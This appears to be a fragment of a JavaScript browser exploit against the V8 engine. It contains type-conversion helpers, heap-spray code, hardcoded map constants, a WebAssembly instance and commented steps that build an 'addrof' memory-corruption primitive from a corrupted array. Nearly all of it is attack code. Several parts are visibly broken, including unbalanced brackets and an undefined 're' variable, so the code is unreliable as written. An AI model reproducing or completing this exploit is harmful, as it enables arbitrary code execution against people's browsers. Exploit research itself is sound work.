<script>

function log(s){O.textContent+="\n"+s;}
const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
function f2i(f){f64[0]=f;return u64[0];}
function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
function hex(n){return"0x"+(n>>>0).toString(16);}
function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}

const DMAP=0x1032a5d,OMAP=0x1032ae5,EMPTY=0x7e5;
const PIN=0x1100011,MAXS=0x7fdffffe;

  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));

const m=re.lastIndex;

  // pinned[0] is at PIN + 8 = 0x1100018 → master[0]
  // Verify by reading pinned[0] = 10.125
  log("m0: "+m[0]);

  // Step 1: Trigger map transition on pinned array by storing an object
  pinned[0] = wasmI;  // V8 transitions pinned to PACKED_ELEMENTS
  // Step 2: Read pinned[0] via master — now it's a tagged pointer stored as raw bytes
  const rawVal = f2i(m[0]);
  // In PACKED_ELEMENTS, each slot is a 4-byte compressed tagged pointer
  // But master reads 8 bytes (as a double). So we get TWO compressed pointers.
  // pinned[0] occupies the LOW 4 bytes, pinned[1] occupies the HIGH 4 bytes
  const ptr0 = rawVal & 0xffffffffn;
  const ptr1 = rawVal >> 32n;
  log("raw: "+rawVal.toString(16)+" ptr0="+ptr0.toString(16)+" ptr1="+ptr1.toString(16));

  // Restore pinned[0] to avoid GC issues
  pinned[0] = 10.125;

  // Check if ptr0 looks like a valid compressed pointer
  if(ptr0 > 0x1000n && ptr0 < 0x10000000n){
    log("ADDROF_OK wasm@"+ptr0.toString(16));

    // pinned's JSArray header is in regular heap (< 0x1100000)
    // We can't reach it from master. But we CAN use the map transition approach:
    // After storing wasmI in pinned[0], the backing store might have been replaced
    // Let's verify if master still reads pinned's data correctly
    pinned[1] = wasmI;
